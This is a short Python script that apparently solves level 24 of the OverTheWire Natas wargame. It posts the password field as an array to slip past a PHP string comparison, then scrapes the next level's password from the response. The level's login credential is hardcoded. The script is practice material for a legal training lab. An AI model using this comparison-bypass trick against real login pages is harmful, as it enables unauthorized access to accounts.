import requests
import re

username = "natas24"
password = "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX"
url = 'http://%s.natas.labs.overthewire.org/' % username

payload = {"passwd[]":"peppaPig"}
session = requests.session()
response = session.post(url, auth=(username,password), data=payload)
#response = session.get(url, auth=(username,password))

#print(response.text)
print (re.findall("Password: (.*)</pre>",response.text)[0])
